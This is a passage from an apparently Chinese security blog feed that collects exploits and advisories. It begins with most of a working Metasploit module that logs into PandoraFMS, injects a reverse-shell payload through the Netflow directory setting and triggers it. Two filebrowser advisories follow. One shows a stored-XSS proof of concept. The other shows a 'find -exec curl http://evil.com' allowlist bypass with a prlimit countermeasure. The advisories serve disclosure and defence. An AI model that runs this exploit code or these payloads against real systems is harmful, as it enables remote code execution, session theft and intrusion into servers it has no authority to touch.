class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          This module exploits a command injection vulnerability <span class="hljs-keyword">in</span> Netflow component <span class="hljs-keyword">of</span> PandoraFMS. The module requires set <span class="hljs-keyword">of</span> user credentials <span class="hljs-keyword">to</span> modify Netflow settings. Also, Netflow binaries have <span class="hljs-keyword">to</span> present <span class="hljs-literal">on</span> the system.<br>        &#125;,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<span class="hljs-string">&#x27;msutovsky-r7&#x27;</span>], <span class="hljs-comment"># researcher, module dev</span><br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [ <span class="hljs-string">&#x27;OSVDB&#x27;</span>, <span class="hljs-string">&#x27;12345&#x27;</span> ],<br>          [ <span class="hljs-string">&#x27;EDB&#x27;</span>, <span class="hljs-string">&#x27;12345&#x27;</span> ],<br>          [ <span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;http://www.example.com&#x27;</span>],<br>          [ <span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;1978-1234&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [<span class="hljs-string">&#x27;unix&#x27;</span>, <span class="hljs-string">&#x27;linux&#x27;</span>],<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; [ ARCH_CMD ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br><br>          [<br>            <span class="hljs-string">&#x27;Linux/Unix Command&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [<span class="hljs-string">&#x27;unix&#x27;</span>, <span class="hljs-string">&#x27;linux&#x27;</span>],<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; [ ARCH_CMD]<br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-12-30&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;RPORT&#x27;</span> =&gt; <span class="hljs-number">80</span>,<br>          <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;cmd/linux/http/x64/meterpreter/reverse_tcp&#x27;</span>,<br>          <span class="hljs-string">&#x27;FETCH_WRITABLE_DIR&#x27;</span> =&gt; <span class="hljs-string">&#x27;/tmp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS, CONFIG_CHANGES]<br>        &#125;<br>      )<br>    )<br><br>    register_options(<br>      [<br>        OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The base path to PandoraFMS application&#x27;</span>, <span class="hljs-string">&#x27;/pandora_console/&#x27;</span>]),<br>        OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Username to PandoraFMS applicaton&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>]),<br>        OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Password to PandoraFMS application&#x27;</span>, <span class="hljs-string">&#x27;pandora&#x27;</span>])<br>      ]<br>    )<br>  end<br><br>  def check<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;index.php&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;login&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span> &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">return</span> Msf::Exploit::CheckCode::Unknown(<span class="hljs-string">&#x27;Received unexpected response&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    html = res.get_html_document<br><br>    <span class="hljs-keyword">return</span> Msf::Exploit::CheckCode::Unknown(<span class="hljs-string">&#x27;Response seems to be empty&#x27;</span>) <span class="hljs-keyword">unless</span> html<br><br>    version = html.at(<span class="hljs-string">&#x27;div[@id=&quot;ver_num&quot;]&#x27;</span>)&amp;.text<br><br>    @csrf_token = html.at(<span class="hljs-string">&#x27;input[@id=&quot;hidden-csrf_code&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br><br>    <span class="hljs-keyword">return</span> Msf::Exploit::CheckCode::Safe(<span class="hljs-string">&#x27;Application is not probably PandoraFMS&#x27;</span>) <span class="hljs-keyword">unless</span> version<br><br>    version = version[<span class="hljs-number">1.</span>.]&amp;.sub(<span class="hljs-string">&#x27;NG&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>    vprint_warning(<span class="hljs-string">&#x27;Token was not parsed, will try again&#x27;</span>) <span class="hljs-keyword">unless</span> @csrf_token<br><br>    vprint_status(<span class="hljs-string">&quot;Version <span class="hljs-subst">#&#123;version&#125;</span> detected&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> Exploit::CheckCode::Vulnerable(<span class="hljs-string">&quot;Vulnerable PandoraFMS version <span class="hljs-subst">#&#123;version&#125;</span> detected&quot;</span>) <span class="hljs-keyword">unless</span> Rex::Version.<span class="hljs-keyword">new</span>(version) &lt; Rex::Version.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;7.0.777.10&#x27;</span>)<br><br>    Msf::Exploit::CheckCode::Safe(<span class="hljs-string">&#x27;Running version is not vulnerable&#x27;</span>)<br>  end<br><br>  def get_csrf_token<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;index.php&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;login&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span> &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with Failure::UnexpectedReply, <span class="hljs-string">&#x27;Recevied unexpected response&#x27;</span> <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    html = res.get_html_document<br><br>    fail_with Failure::UnexpectedReply, <span class="hljs-string">&#x27;Empty response received&#x27;</span> <span class="hljs-keyword">unless</span> html<br>    html.at(<span class="hljs-string">&#x27;div[@id=&quot;ver_num&quot;]&#x27;</span>)&amp;.text<br><br>    @csrf_token = html.at(<span class="hljs-string">&#x27;input[@id=&quot;hidden-csrf_code&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br><br>    fail_with Failure::NotFound, <span class="hljs-string">&#x27;Could not found CSRF token&#x27;</span> <span class="hljs-keyword">unless</span> @csrf_token<br>  end<br><br>  def login<br>    res = send_request_cgi!(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;index.php&#x27;</span>),<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;login&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span> &#125;,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt;<br>      &#123;<br>        <span class="hljs-string">&#x27;nick&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;pass&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;login_button&#x27;</span> =&gt; <span class="hljs-string">&quot;Let&#x27;s go&quot;</span>,<br>        <span class="hljs-string">&#x27;csrf_code&#x27;</span> =&gt; @csrf_token<br>      &#125;<br>    &#125;)<br>    fail_with Failure::NoAccess, <span class="hljs-string">&#x27;Invalid credentials&#x27;</span> <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span> &amp;&amp; res.body.include?(<span class="hljs-string">&#x27;id=&quot;welcome-icon-header&quot;&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;id=&quot;welcome_panel&quot;&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;godmode&#x27;</span>)<br>  end<br><br>  def configure_netflow<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;index.php&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;sec&#x27;</span> =&gt; <span class="hljs-string">&#x27;general&#x27;</span>, <span class="hljs-string">&#x27;sec2&#x27;</span> =&gt; <span class="hljs-string">&#x27;godmode/setup/setup&#x27;</span>, <span class="hljs-string">&#x27;section&#x27;</span> =&gt; <span class="hljs-string">&#x27;net&#x27;</span> &#125;<br>    &#125;)<br><br>    fail_with Failure::NotFound, <span class="hljs-string">&#x27;Netflow might not be enabled&#x27;</span> <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    html = res.get_html_document<br><br>    fail_with Failure::UnexpectedReply, <span class="hljs-string">&#x27;Unexpected response when trying to configure Netflow&#x27;</span> <span class="hljs-keyword">unless</span> html<br><br>    netflow_daemon_value = html.at(<span class="hljs-string">&#x27;input[@name=&quot;netflow_daemon&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br>    netflow_nfdump_value = html.at(<span class="hljs-string">&#x27;input[@name=&quot;netflow_nfdump&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br>    netflow_nfexpire_value = html.at(<span class="hljs-string">&#x27;input[@name=&quot;netflow_nfexpire&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br>    netflow_max_resolution_value = html.at(<span class="hljs-string">&#x27;input[@name=&quot;netflow_max_resolution&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br>    netflow_disable_custom_lvfilters_sent_value = html.at(<span class="hljs-string">&#x27;input[@name=&quot;netflow_disable_custom_lvfilters_sent&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br>    netflow_max_lifetime_value = html.at(<span class="hljs-string">&#x27;input[@name=&quot;netflow_max_lifetime&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br>    netflow_interval_value = html.at(<span class="hljs-string">&#x27;select[@name=&quot;netflow_interval&quot;]//option[@selected=&quot;selected&quot;]&#x27;</span>)&amp;.attributes&amp;.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, nil)<br><br>    fail_with Failure::Unknown, <span class="hljs-string">&#x27;Failed to get existing Netflow configuration&#x27;</span> <span class="hljs-keyword">unless</span> netflow_daemon_value &amp;&amp; netflow_nfdump_value &amp;&amp; netflow_nfexpire_value &amp;&amp; netflow_max_resolution_value &amp;&amp; netflow_disable_custom_lvfilters_sent_value &amp;&amp; netflow_max_lifetime_value &amp;&amp; netflow_interval_value<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;index.php&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;sec&#x27;</span> =&gt; <span class="hljs-string">&#x27;general&#x27;</span>, <span class="hljs-string">&#x27;sec2&#x27;</span> =&gt; <span class="hljs-string">&#x27;godmode/setup/setup&#x27;</span>, <span class="hljs-string">&#x27;section&#x27;</span> =&gt; <span class="hljs-string">&#x27;net&#x27;</span> &#125;,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt;<br>      &#123;<br>        <span class="hljs-string">&#x27;netflow_name_dir&#x27;</span> =&gt; <span class="hljs-string">&#x27;;&#x27;</span> + payload.encoded.gsub(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;$&#123;IFS&#125;&#x27;</span>) + <span class="hljs-string">&#x27;#;&#x27;</span>,<br>        <span class="hljs-string">&#x27;netflow_daemon&#x27;</span> =&gt; netflow_daemon_value,<br>        <span class="hljs-string">&#x27;netflow_nfdump&#x27;</span> =&gt; netflow_nfdump_value,<br>        <span class="hljs-string">&#x27;netflow_max_resolution&#x27;</span> =&gt; netflow_max_resolution_value,<br>        <span class="hljs-string">&#x27;netflow_disable_custom_lvfilters_sent&#x27;</span> =&gt; netflow_disable_custom_lvfilters_sent_value,<br>        <span class="hljs-string">&#x27;netflow_max_lifetime&#x27;</span> =&gt; netflow_max_lifetime_value,<br>        <span class="hljs-string">&#x27;netflow_interval&#x27;</span> =&gt; netflow_interval_value,<br>        <span class="hljs-string">&#x27;update_config&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;upd_button&#x27;</span> =&gt; <span class="hljs-string">&#x27;Update&#x27;</span><br>      &#125;<br>    &#125;)<br>    fail_with Failure::PayloadFailed, <span class="hljs-string">&#x27;Failed to configure Netflow&#x27;</span> <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br>  end<br><br>  def trigger_payload<br>    send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;index.php&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;sec&#x27;</span> =&gt; <span class="hljs-string">&#x27;network_traffic&#x27;</span>, <span class="hljs-string">&#x27;sec2&#x27;</span> =&gt; <span class="hljs-string">&#x27;operation/netflow/netflow_explorer&#x27;</span> &#125;<br>    &#125;)<br>  end<br><br>  def exploit<br>    <span class="hljs-comment"># do we have csrf token already</span><br>    get_csrf_token <span class="hljs-keyword">unless</span> @csrf_token<br><br>    login<br><br>    configure_netflow<br><br>    trigger_payload<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; PandoraFMS Netflow Authenticated Remote</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>filebrowser allows Stored Cross-Site Scripting through the Markdown preview function</title>
    <link href="http://example.com/2025/06/27/github_3944019886/"/>
    <id>http://example.com/2025/06/27/github_3944019886/</id>
    <published>2025-06-27T15:30:12.345Z</published>
    <updated>2025-06-27T15:30:12.342Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-4wx8-5gm2-2j97">https://github.com/advisories/GHSA-4wx8-5gm2-2j97</a></p><p><strong>仓库 Star：</strong> 29900</p><p><strong>CVSS 评分：</strong> 7.6</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-4wx8-5gm2-2j97">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-4wx8-5gm2-2j97</a></p></li><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52902">https://nvd.nist.gov/vuln/detail/CVE-2025-52902</a></p></li><li><p><a href="https://github.com/filebrowser/filebrowser/commit/f19943a42e8e092e811dffbe9f4623dac36f1f0d">https://github.com/filebrowser/filebrowser/commit/f19943a42e8e092e811dffbe9f4623dac36f1f0d</a></p></li><li><p><a href="https://github.com/advisories/GHSA-4wx8-5gm2-2j97">https://github.com/advisories/GHSA-4wx8-5gm2-2j97</a></p></li></ul><p><strong>描述：</strong></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>The Markdown preview function of File Browser v2.32.0 is vulnerable to <em>Stored Cross-Site-Scripting (XSS)</em>. Any JavaScript code that is part of a Markdown file uploaded by a user will be executed by the browser</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>A user can upload a malicious Markdown file to the application which can contain arbitrary HTML code. If another user within the same scope clicks on that file, a rendered preview is opened. JavaScript code that has been included will be executed.</p><p> Malicious actions that are possible include:</p><ul><li>Obtaining a user’s session token</li><li>Elevating the attacker’s privileges, if the victim is an administrator (e.g., gaining command execution rights)</li></ul><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>Most Markdown parsers accept arbitrary HTML in a document and try rendering it accordingly. For instance, if one creates a file called <code>xss.md</code> with the following content:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># Hallo</span><br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span></span>foo<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span></span><br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;xx&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(9)</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span></span>bar<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>Bold and italic text will be rendered. Also, the renderer used in File Browser will try to display the image and execute the code in the <code>onerror</code> event handler.</p><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><p>The screenshot shows that the code from the file mentioned above has actually been executed in the victim’s browser:</p><p><img src="https://github.com/user-attachments/assets/3a3b9920-fbd8-433f-a016-ea77f5f68851" alt="JavaScript code being executed in the Markdown Preview"></p><h2 id="Recommended-Countermeasures"><a href="#Recommended-Countermeasures" class="headerlink" title="Recommended Countermeasures"></a>Recommended Countermeasures</h2><p>The most thorough fix would be to reconfigure the application’s Markdown parser to ignore all HTML elements and only render rich text which is part of the Markdown specification. If HTML rendering is considered to be a required feature, an HTML sanitizer like DOMPurify should be used, preferably in conjunction with a <em>Content Security Policy</em> (CSP).</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><code>2025-03-25</code> Identified the vulnerability in version 2.32.0</li><li><code>2025-04-11</code> Contacted the project</li><li><code>2025-04-18</code> Vulnerability disclosed to the project</li><li><code>2025-06-25</code> Uploaded advisories to the project’s GitHub repository</li><li><code>2025-06-26</code> CVE ID assigned by GitHub</li><li><code>2025-06-26</code> Fix released with version 2.33.7</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://github.com/cure53/DOMPurify">DOMPurify</a></li></ul><h2 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h2><ul><li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-4wx8-5gm2-2j97&quot;&gt;https://github.com/advisories/GHSA-4wx8-5gm2-2j97&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>filebrowser Allows Shell Commands to Spawn Other Commands</title>
    <link href="http://example.com/2025/06/27/github_1098564794/"/>
    <id>http://example.com/2025/06/27/github_1098564794/</id>
    <published>2025-06-27T15:30:10.365Z</published>
    <updated>2025-06-27T15:30:10.362Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-3q2w-42mv-cph4">https://github.com/advisories/GHSA-3q2w-42mv-cph4</a></p><p><strong>仓库 Star：</strong> 29900</p><p><strong>CVSS 评分：</strong> 8.1</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3q2w-42mv-cph4">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3q2w-42mv-cph4</a></p></li><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52903">https://nvd.nist.gov/vuln/detail/CVE-2025-52903</a></p></li><li><p><a href="https://github.com/filebrowser/filebrowser/issues/5199">https://github.com/filebrowser/filebrowser/issues/5199</a></p></li><li><p><a href="https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108">https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108</a></p></li><li><p><a href="https://github.com/advisories/GHSA-3q2w-42mv-cph4">https://github.com/advisories/GHSA-3q2w-42mv-cph4</a></p></li></ul><p><strong>描述：</strong></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>The <em>Command Execution</em> feature of File Browser only allows the execution of shell command which have been predefined on a user-specific allowlist. Many tools allow the execution of arbitrary different commands, rendering this limitation void.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>The concrete impact depends on the commands being granted to the attacker, but the large number of standard commands allowing the execution of subcommands makes it likely that every user having the <code>Execute commands</code> permissions can exploit this vulnerability. Everyone who can exploit it will have full code execution rights with the <em>uid</em> of the server process.</p><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>Many Linux commands allow the execution of arbitrary different commands. For example, if a user is authorized to run only the <code>find</code> command and nothing else, this restriction can be circumvented by using the <code>-exec</code> flag.</p><p>Some common commands having the ability to launch external commands and which are included in the official container image of Filebrowser are listed below. The website <a href="https://gtfobins.github.io/">https://gtfobins.github.io</a> gives a comprehensive overview:</p><ul><li><a href="https://gtfobins.github.io/gtfobins/cpio">https://gtfobins.github.io/gtfobins/cpio</a></li><li><a href="https://gtfobins.github.io/gtfobins/find">https://gtfobins.github.io/gtfobins/find</a></li><li><a href="https://gtfobins.github.io/gtfobins/sed">https://gtfobins.github.io/gtfobins/sed</a></li><li><a href="https://gtfobins.github.io/gtfobins/git">https://gtfobins.github.io/gtfobins/git</a></li><li><a href="https://gtfobins.github.io/gtfobins/env">https://gtfobins.github.io/gtfobins/env</a></li></ul><p>As a prerequisite, an attacker needs an account with the <code>Execute Commands</code> permission and some permitted commands.</p><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><p>The following screenshot demonstrates, how this can be used to issue a network call to an external server:</p><p><img src="https://github.com/user-attachments/assets/02ef0833-79ee-40f7-87b8-bbb3fe102eab" alt="image"></p><h2 id="Recommended-Countermeasures"><a href="#Recommended-Countermeasures" class="headerlink" title="Recommended Countermeasures"></a>Recommended Countermeasures</h2><p>Until this issue is fixed, we recommend to completely disable <code>Execute commands</code> for all accounts. Since the command execution is an inherently dangerous feature that is not used by all deployments, it should be possible to completely disable it in the application’s configuration.</p><p>The <code>prlimit</code> command can be used to prevent the execution of subcommands:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ find . -<span class="hljs-built_in">exec</span> curl http://evil.com &#123;&#125; \;<br>&lt;HTML&gt;<br>&lt;HEAD&gt;<br>[...]<br><br>$ prlimit --<span class="hljs-built_in">nproc</span>=0 find . -<span class="hljs-built_in">exec</span> curl http://evil.com &#123;&#125; \;<br>find: cannot fork: Resource temporarily unavailable<br></code></pre></td></tr></table></figure><p>It should be prepended to any command executed in the context of the application. <code>prlimit</code> can be used for containerized deployments as well as for bare-metal ones.</p><p>WARNING: Note that this does prevent any unexpected behavior from the authorized command. For example, the <code>find</code> command can also delete files directly via its <code>-delete</code> flag.</p><p>As a defense-in-depth measure, Filebrowser should provide an additional container image based on a <em>distroless</em> base image.</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><code>2025-06-25</code> A patch version has been pushed to disable the feature for all existent installations, and making it <strong>opt-in</strong>. A warning has been added to the documentation and is printed on the console if the feature is enabled. Due to the project being in maintenance-only mode, the bug has not been fixed. Fix is tracked on <a href="https://github.com/filebrowser/filebrowser/issues/5199">https://github.com/filebrowser/filebrowser/issues/5199</a>.</li><li><code>2025-03-26</code> Identified the vulnerability in version 2.32.0</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://manpages.debian.org/bookworm/util-linux/prlimit.1.en.html">prlimit</a></li><li><a href="https://github.com/GoogleContainerTools/distroless">“Distroless” Container Images.</a></li></ul><h2 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h2><ul><li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-3q2w-42mv-cph4&quot;&gt;https://github.com/advisories/GHSA-3q2w-42mv-cph4&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>LLaMA-Factory allows Code Injection through improper vhead_file safeguards</title>
    <link href="http://example.com/2025/06/27/github_831739859/"/>
    <id>http://example.com/2025/06/27/github_831739859/</id>
    <published>2025-06-27T15:30:08.809Z</published>
    <updated>2025-06-27T15:30:08.806Z</updated>
    
